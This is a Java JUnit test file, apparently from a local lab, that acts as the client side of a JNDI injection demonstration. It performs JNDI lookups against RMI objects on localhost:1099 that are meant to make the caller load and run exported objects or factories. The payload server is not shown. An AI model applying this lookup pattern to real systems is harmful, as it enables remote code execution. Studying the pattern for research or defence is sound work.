import org.junit.Test;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

/**
 * 类名:JNDIExploitClient <br/>
 * 描述:JNDI注入客户端 <br/>
 * 时间:2021/12/13 14:04 <br/>
 *
 * @author lanhaifeng
 * @version 1.0
 */
public class JNDIExploitClient {

    @Test
    public void testLocalExploit() throws NamingException, RemoteException {
        String url = "rmi://localhost:1099/ExportLocalObject";
        InitialContext initialContext = new InitialContext();
        ExploitLocalService exploitLocalService = (ExploitLocalService)initialContext.lookup(url);
        exploitLocalService.execute();
    }

    @Test
    public void testRmiExploit() throws NamingException {
        String url = "rmi://localhost:1099/ExportObject";
        InitialContext initialContext = new InitialContext();
        System.out.println(System.getProperty("os.name").toLowerCase());
        initialContext.lookup(url);
    }

    @Test
    public void testLocalFactoryExploit() throws NamingException {
        String url = "rmi://localhost:1099/ExportLocalFactoryObject";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    }
}
